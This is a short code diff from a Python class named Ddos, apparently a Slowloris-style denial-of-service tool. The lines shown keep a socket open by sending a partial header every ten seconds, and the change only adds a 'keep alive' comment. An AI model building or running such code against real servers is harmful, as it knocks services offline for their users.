@@ -71,7 +71,7 @@ class Ddos(Thread):
                 while self.stop_threads:
                     try:
                         time.sleep(10)
-                        s.send(f"X-a:1".encode("utf-8"))
+                        s.send(f"X-a:1".encode("utf-8")) #keep alive
                     except socket.error as e:
                         break
             except socket.error as e:
